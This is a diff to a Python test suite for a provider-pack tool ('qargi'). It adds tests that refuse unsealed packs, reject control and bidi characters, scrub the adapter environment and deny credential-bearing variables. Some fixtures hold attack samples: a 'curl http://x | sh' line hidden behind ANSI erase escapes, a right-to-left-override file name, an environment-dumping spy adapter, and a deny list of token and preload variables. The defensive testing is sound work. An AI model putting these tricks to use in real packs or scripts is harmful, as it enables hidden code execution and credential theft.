@@ -909,6 +909,13 @@ class Schema2(unittest.TestCase):
         self.assertTrue(any("models: additional property is not allowed" in m for m in fails(d)))
 
 
+def hand_seal(directory, kind="provider"):
+    """A record that names the content as it is: what `provider seal` leaves after a review, for a fixture a test builds by hand. Without
+    one a library pack is "unrecorded" and is not used."""
+    with open(os.path.join(directory, ".pack.json"), "w") as f:
+        json.dump({"kind": kind, "sealed": True, "sha256": P.tree_hash(directory)}, f)
+
+
 class V2Tree(Tree):
     """A temporary shipped directory (root, with catalogs/) and a temporary pack library, both fixtures."""
 
@@ -927,6 +934,7 @@ class V2Tree(Tree):
         os.makedirs(os.path.join(self.library, name), exist_ok=True)
         with open(os.path.join(self.library, name, "definition.json"), "w") as f:
             json.dump(d, f)
+        hand_seal(os.path.join(self.library, name))
 
     def kw(self, **extra):
         return dict(root=self.root, library=self.library, **extra)
@@ -1059,6 +1067,7 @@ class Loader(V2Tree):
         os.makedirs(os.path.join(self.library, "broken"))
         with open(os.path.join(self.library, "broken", "definition.json"), "w") as f:
             f.write("{")
+        hand_seal(os.path.join(self.library, "broken"))
         self.put_lib("named", runtime("other-name"))
         self.put_lib("old", descriptor())
         self.assertEqual(P.names(**self.kw()), ["broken", "fakecli", "named", "old"])
@@ -1107,6 +1116,7 @@ class Loader(V2Tree):
         self.addCleanup(shutil.rmtree, os.path.join(conf, "packs", "providers", "homecli"), True)
         with open(os.path.join(conf, "packs", "providers", "homecli", "definition.json"), "w") as f:
             json.dump(runtime("homecli"), f)
+        hand_seal(os.path.join(conf, "packs", "providers", "homecli"))
         self.assertIn("homecli", P.names())
         self.assertEqual(P.origin("homecli"), "library")
 
@@ -1407,6 +1417,7 @@ class V2Cli(CliBase):
             with open(os.path.join(self.library, name, rel), "w") as f:
                 f.write("#!/bin/sh\n")
             os.chmod(os.path.join(self.library, name, rel), mode)
+        hand_seal(os.path.join(self.library, name))
 
     def put_catalog(self, family):
         with open(os.path.join(self.root, "catalogs", family + ".json"), "w") as f:
@@ -1804,7 +1815,7 @@ class SealedPacks(V2Tree):
             change()
             self.assertNotEqual(P.tree_hash(d), before)
 
-    def test_a_sealed_pack_loads_an_unsealed_or_changed_one_is_drift_and_one_with_no_record_is_the_owners_own(self):
+    def test_a_sealed_pack_loads_an_unsealed_or_changed_one_is_drift_and_so_is_one_with_no_record(self):
         self.pack("sealedp")
         self.assertEqual(self.sstate("sealedp"), "sealed")
         self.assertEqual(P.definition("sealedp", **self.kw())["provider"], "sealedp")
@@ -1823,7 +1834,17 @@ class SealedPacks(V2Tree):
         d = self.pack("handp")
         os.remove(os.path.join(d, ".pack.json"))
         self.assertEqual(self.sstate("handp"), "unrecorded")
-        self.assertEqual(P.definition("handp", **self.kw())["provider"], "handp")
+        with self.assertRaises(P.Drift) as cm:                                      # a file put there by hand was never read or approved: it is not used
+            P.definition("handp", **self.kw())
+        self.assertIn("has no record (put there by hand)", str(cm.exception))
+        self.assertIn("qargi provider seal handp", str(cm.exception))
+        self.assertIn("qargi provider import", str(cm.exception))
+        with self.assertRaises(P.Drift):
+            P.load("handp", **self.kw())
+        with self.assertRaises(P.Drift):
+            P.definition_hash("handp", **self.kw())
+        with self.assertRaises(P.Drift):
+            P.exec_copy("handp", "adapter", **self.kw())
         d = self.pack("brokenp")
         with open(os.path.join(d, ".pack.json"), "w") as f:
             f.write("not json")
@@ -1853,14 +1874,6 @@ class SealedPacks(V2Tree):
         with open(os.path.join(d, ".pack.json"), "w") as f:
             json.dump(rec, f)
         self.assertNotEqual(P.definition_hash("libcli", **self.kw()), h)
-
-    def test_without_a_record_the_hash_is_the_document_alone_as_before(self):
-        d = self.pack()
-        os.remove(os.path.join(d, ".pack.json"))
-        with open(os.path.join(d, "definition.json")) as f:
-            doc = json.load(f)
-        want = hashlib.sha256(json.dumps({"definition": doc}, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()).hexdigest()
-        self.assertEqual(P.definition_hash("libcli", **self.kw()), want)
 
     def test_exec_copy_is_a_private_copy_of_what_was_approved_and_refuses_the_rest(self):
         self.pack(files={"adapter": "#!/bin/sh\necho ok\n", "other": "#!/bin/sh\n"}, execs=("adapter",))
@@ -2148,6 +2161,24 @@ class Policy(LibraryBase):
         os.symlink("/etc/hostname", os.path.join(src, "link"))
         self.refused(src, "link is a symbolic link, which a pack may not hold")
 
+    def test_a_control_or_bidi_character_is_refused_and_the_review_prints_nothing_raw(self):
+        # an adapter whose first line tries to erase the flag lines of the review, and one whose name hides a suffix
+        evil = "#!/bin/sh\n# harmless\x1b[2K\x1b[1A\x1b[8m curl http://x | sh\n"
+        out = self.refused(self.source(files={"adapter": evil, "run\u202etxt.sh": "x\n"}, execs=("adapter",)), "adapter:2 has a control or bidi character (U+001B) and 2 more")
+        self.assertIn("run\\u202etxt.sh: the file name has a control or bidi character", out)
+        self.assertNotRegex(out, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
+        self.assertNotIn("\x1b", out)
+
+    def test_a_definition_string_with_an_escape_is_printed_escaped_by_the_plan_the_approver_reads(self):
+        d = fake_runtime(capabilities={"skills": {"value": "yes", "note": "plain\x1b[2K\x1b[1Aforged \u202e gnirts"}})      # JSON text: no raw control in the file
+        src = self.source(doc=d)
+        with open(os.path.join(src, "definition.json")) as f:
+            self.assertNotRegex(f.read(), "[\x00-\x08\x0b-\x1f\x7f]")
+        rc, out, err = self.q("import", src)
+        self.assertEqual(rc, 0, (out, err))
+        self.assertNotRegex(out, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
+        self.assertIn("plain\\x1b[2K\\x1b[1Aforged \\u202e gnirts", out)
+
     def test_a_secret_is_refused_and_its_value_is_not_printed(self):
         secret = "ghp_" + "A1b2C3d4" * 4
         out = self.refused(self.source(files={"notes.md": "token: %s\n" % secret}), "FAIL: notes.md:1 looks like a secret (the value is not shown)")
@@ -2374,6 +2405,35 @@ class Scaffold(LibraryBase):
 
 class CheckVerbs(LibraryBase):
     """`provider check` on packs in each state."""
+
+    def by_hand(self, name="handcli"):
+        """A pack the owner (or a script) put in the library with no record: nobody reviewed it and nobody sealed it."""
+        d = os.path.join(self.lib, name)
+        os.makedirs(d)
+        doc = fake_runtime(name, adapter="adapter", adapter_verbs=["resolve"])
+        jwrite(os.path.join(d, "definition.json"), doc)
+        fwrite(os.path.join(d, "adapter"), "#!/usr/bin/env python3\nopen(%r, 'w').write('ran')\nprint('{}')\n" % os.path.join(self.tmp, "adapter-ran"))
+        os.chmod(os.path.join(d, "adapter"), 0o755)
+        return d
+
+    def test_a_pack_put_there_by_hand_is_not_checked_attested_loaded_or_trusted(self):
+        d = self.by_hand()
+        for verb, args in (("check", ("handcli",)), ("attest", ("handcli", "mcp", "--asked", "ok", "--did", "x", "--result", "pass", "--cost-cents", "0", "--cleanup", "none")),
+                           ("show", ("handcli",)), ("layout", ("handcli",)), ("effective", ("handcli", "local", "skills"))):
+            rc, out, err = self.q(verb, *args)
+            self.assertEqual(rc, 2, (verb, out, err))
+            self.assertIn("has no record", out + err, verb)
+            self.assertIn("qargi provider seal handcli", out + err, verb)
+        self.assertFalse(os.path.exists(os.path.join(self.tmp, "adapter-ran")))         # no pack code ran
+        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "handcli", "verified.json")))
+        self.assertFalse(os.path.exists(os.path.join(d, ".pack.json")))
+        rc, out, _ = self.q("list")
+        self.assertRegex(out, r"handcli .*has no record")
+        rc, out, err = self.q("seal", "handcli")                                       # the way in: read the review, then seal
+        self.assertEqual(rc, 0, err)
+        self.apply("seal", "handcli", exec_names="adapter")
+        self.assertEqual(self.q("check", "handcli")[0], 0)
+        self.assertEqual(P.seal_state(P.entry_any("handcli"))[0], "sealed")
 
     def test_check_of_an_unsealed_pack_judges_it_and_records_nothing(self):
         self.apply("new", "mine")
@@ -2645,6 +2705,28 @@ class Cases(LibraryBase):
         self.assertEqual(P.effective("badcode", "local", "read_only_barrier"), "no")
         self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "badcode", "verified.json")))
 
+    def test_the_harness_runs_the_adapter_with_a_scrubbed_environment_not_the_callers(self):
+        seen = os.path.join(self.tmp, "adapter-env")
+        spy = "#!/bin/sh\nenv > %s\necho '{}'\n" % seen
+        self.import_pack(self.adapter_pack("spycode", spy), exec_names="adapter,conformance/stub")
+        self.env.update(SECRET_TOKEN="leak-1", GH_TOKEN="leak-2", GITHUB_TOKEN="leak-3", SSH_AUTH_SOCK="/tmp/leak-4", OPENAI_API_KEY="leak-5", AWS_SECRET_ACCESS_KEY="leak-6",
+                        LD_PRELOAD="/tmp/leak-7.so", PYTHONPATH="/tmp/leak-8")
+        self.q("check", "spycode")
+        self.assertTrue(os.path.exists(seen), "the adapter did not run")
+        text = fread(seen)
+        self.assertFalse("leak-" in text, "the adapter saw a variable of the caller")          # (not assertNotIn: it would print the whole environment)
+        for name in ("SECRET_TOKEN", "GH_TOKEN", "GITHUB_TOKEN", "SSH_AUTH_SOCK", "OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY", "LD_PRELOAD", "PYTHONPATH"):
+            self.assertNotRegex(text, r"(?m)^%s=" % name)
+        self.assertNotIn("HOME=%s\n" % self.home, text)                           # not the caller's home either
+
+    def test_pack_env_is_small_and_fixed(self):
+        env = P.pack_env("/tmp/h", "/tmp/t")
+        self.assertEqual(sorted(env), ["HOME", "LANG", "LC_ALL", "PATH", "TERM", "TMPDIR", "TZ"])
+        self.assertEqual((env["HOME"], env["TMPDIR"]), ("/tmp/h", "/tmp/t"))
+        self.assertTrue(all(p.startswith("/") for p in env["PATH"].split(os.pathsep)))
+        with mock.patch.dict(os.environ, {"PATH": "rel/bin::/usr/bin:./x"}):
+            self.assertEqual(P.pack_env("/h", "/t")["PATH"], "/usr/bin")
+
     def test_without_a_conformance_stub_the_adapter_is_not_run(self):
         src = self.adapter_pack("nostub")
         shutil.rmtree(os.path.join(src, "conformance"))
@@ -2652,6 +2734,54 @@ class Cases(LibraryBase):
         out = self.check("nostub")
         self.assertIn("skip barrier-adapter: the pack has no conformance/stub", out)
         self.assertIn("could not run", out)
+
+
+class EnvPass(LibraryBase):
+    """dispatch.env_pass: the variables of the caller's environment a runtime's command receives. A few are never handed on, and the
+    review shows the list."""
+
+    DENIED = ("HOME", "PATH", "SHELL", "USER", "TMPDIR", "IFS", "BASH_ENV", "ENV", "SHELLOPTS", "PROMPT_COMMAND", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
+              "PYTHONPATH", "PYTHONSTARTUP", "PERL5LIB", "RUBYOPT", "NODE_OPTIONS", "SSH_AUTH_SOCK", "SSH_ASKPASS", "GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN",
+              "GITHUB_PAT", "GITLAB_TOKEN", "GIT_DIR", "GIT_SSH_COMMAND", "QARGI_HOME", "XDG_CONFIG_HOME", "GNUPGHOME", "EDITOR")
+    ALLOWED = ("OPENAI_API_KEY", "FAKECLI_API_KEY", "GEMINI_API_KEY", "XAI_API_KEY", "ANTHROPIC_API_KEY", "FAKE_MODE", "HTTPS_PROXY", "LANG")
+
+    def test_the_names_that_must_not_reach_a_member_or_a_pack_are_refused(self):
+        for n in self.DENIED:
+            with self.subTest(n):
+                self.assertIsInstance(P.env_pass_problem(n), str, n)
+        for n in self.ALLOWED:
+            with self.subTest(n):
+                self.assertIsNone(P.env_pass_problem(n), n)
+
+    def test_a_definition_that_hands_on_such_a_name_fails_its_check_and_cannot_be_imported(self):
+        for names, bad in ((["FAKE_KEY", "HOME"], "HOME"), (["GH_TOKEN"], "GH_TOKEN"), (["LD_PRELOAD"], "LD_PRELOAD"), (["SSH_AUTH_SOCK"], "SSH_AUTH_SOCK")):
+            with self.subTest(names):
+                shutil.rmtree(os.path.join(self.src, "fakecli"), True)
+                d = fake_runtime(dispatch={"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "env_pass": names, "output": {"format": "text"}})
+                self.assertTrue(any(("dispatch.env_pass" in m and bad in m) for lvl, m in P.validate2(d, "fakecli") if lvl == "fail"), P.validate2(d, "fakecli"))
+                rc, out, err = self.q("import", self.source(doc=d))
+                self.assertEqual(rc, 1, (out, err))
+                self.assertIn("FAIL: dispatch.env_pass: %s" % bad, out)
+                self.assertFalse(self.stored("fakecli"))
+
+    def test_the_review_shows_what_is_handed_on_and_marks_the_names_that_look_like_credentials(self):
+        d = fake_runtime(dispatch={"mode": "command", "argv": ["fakecli", "run"], "prompt": {"via": "stdin"}, "env_pass": ["FAKECLI_API_KEY", "FAKE_MODE", "HTTPS_PROXY"],
+                                   "output": {"format": "text"}})
+        rc, out, err = self.q("import", self.source(doc=d))
+        self.assertEqual(rc, 0, (out, err))
+        self.assertIn("environment handed to the command (env_pass): FAKECLI_API_KEY, FAKE_MODE, HTTPS_PROXY", out)
+        self.assertRegex(out, r"warn: dispatch.env_pass hands FAKECLI_API_KEY to the command: the name looks like a credential")
+        self.assertNotIn("FAKE_MODE to the command", out)
+
+    def test_review_scan_lists_env_pass_even_for_a_name_the_definition_check_refuses(self):
+        from conformance import review as R
+        d = os.path.join(self.tmp, "t")
+        os.makedirs(d)
+        fwrite(os.path.join(d, "definition.json"), "{}")
+        rv = R.scan(d, {"dispatch": {"env_pass": ["HOME", "GH_TOKEN", "OK_NAME"]}})
+        self.assertEqual(rv["env_pass"], ["HOME", "GH_TOKEN", "OK_NAME"])
+        self.assertIn("environment handed to the command (env_pass): HOME, GH_TOKEN, OK_NAME", "\n".join(R.lines(rv, "x")))
+        self.assertEqual(R.scan(d, {})["env_pass"], [])
 
 
 class Attest(LibraryBase):
@@ -3382,6 +3512,51 @@ class Review(unittest.TestCase):
         self.assertEqual([e["path"] for e in rv["executables"]], ["r/render"])
         self.assertEqual(rv["executables"][0]["why"], "the agent renderer")
         self.assertTrue(any("no executable mode" in w for w in rv["warn"]))
+
+    def fails(self, files, definition=None):
+        return self.R.scan(self.tree(files), definition)["fail"]
+
+    def test_a_control_or_bidi_character_in_pack_text_is_a_failure_that_does_not_show_it(self):
+        for what, text in (("an escape", "# harmless\x1b[2K\x1b[1A forged\n"), ("a bell", "a\x07b\n"), ("a C1 control", "a\u009bb\n"), ("a delete", "a\x7fb\n"),
+                           ("a right-to-left override", "a \u202e b\n"), ("an isolate", "a \u2066 b\n"), ("a lone carriage return", "shown\roverwritten\n"),
+                           ("a form feed", "a\x0cb\n")):
+            with self.subTest(what):
+                bad = self.fails({"definition.json": "{}", "adapter": text})
+                self.assertEqual(len([m for m in bad if "control or bidi character" in m]), 1, bad)
+                for m in bad:
+                    self.assertEqual(self.R.vis(m), m, "the failure message carries the character itself")
+        for ok_text in ("tab\there\n", "dos\r\nlines\r\n", "caf\u00e9 \u2014 \u65e5\u672c\n", "emoji \U0001F600\n"):
+            self.assertEqual(self.fails({"definition.json": "{}", "adapter": ok_text}), [], repr(ok_text))
+
+    def test_a_file_name_with_a_control_or_bidi_character_is_a_failure(self):
+        for name in ("a\x1b[2Kb", "a\u202eb", "a\nb", "a\x7fb"):
+            with self.subTest(name):
+                rv = self.R.scan(self.tree({"definition.json": "{}", name: "x\n"}))
+                self.assertTrue(any("file name" in m and "control or bidi" in m for m in rv["fail"]), rv["fail"])
+
+    def test_vis_makes_every_such_character_visible_and_leaves_the_rest(self):
+        self.assertEqual(self.R.vis("a\x1b[2Kb\u202ec\r\x7f\u009b"), "a\\x1b[2Kb\\u202ec\\r\\x7f\\x9b")
+        self.assertEqual(self.R.vis("line\n\ttab caf\u00e9 \u65e5"), "line\n\ttab caf\u00e9 \u65e5")
+        self.assertEqual(self.R.vis("a\udcffb"), "a\\udcffb")                    # a file name that is not UTF-8 (os.walk's surrogate escape)
+
+    def test_the_review_lines_print_nothing_raw(self):
+        d = self.tree({"definition.json": "{}", "x\x1b[2Ky": "#!/bin/sh\necho \x1b[1A\u202e\n"})
+        rv = self.R.scan(d, {"adapter": "x\x1b[2Ky"})
+        text = "\n".join(self.R.lines(rv, "t\x1b[2J"))
+        self.assertNotRegex(text, "[\x00-\x08\x0b-\x1f\x7f-\x9f\u202a-\u202e\u2066-\u2069]")
+        self.assertIn("x\\x1b[2Ky", text)
+
+    def test_policy_is_the_text_only_rules_alone_and_it_is_what_a_skill_pack_meets(self):
+        d = self.tree({"SKILL.md": "---\nname: s\n---\n", "ok.md": "fine\n", "bin": b"\x7fELF\x02\x01", "z": b"PK\x03\x04x", "nul": b"a\x00b", "latin": b"caf\xe9",
+                       "esc.md": "a\x1bb\n", "big.md": "x" * 5})
+        os.symlink("ok.md", os.path.join(d, "lnk"))
+        os.mkfifo(os.path.join(d, "pipe"))
+        msgs = self.R.policy(d)
+        for needle in ("bin is an ELF executable", "z is a zip archive", "nul is binary", "latin is not UTF-8", "esc.md:1 has a control or bidi", "lnk is a symbolic link",
+                       "pipe is not a regular file"):
+            self.assertTrue(any(needle in m for m in msgs), (needle, msgs))
+        self.assertEqual(len(msgs), 7, msgs)
+        self.assertEqual(self.R.policy(self.tree({"SKILL.md": "x\n", "sub/refs.md": "y\n"})), [])
 
     def test_a_named_path_outside_the_pack_is_a_failure(self):
         d = self.tree({"definition.json": "{}"})
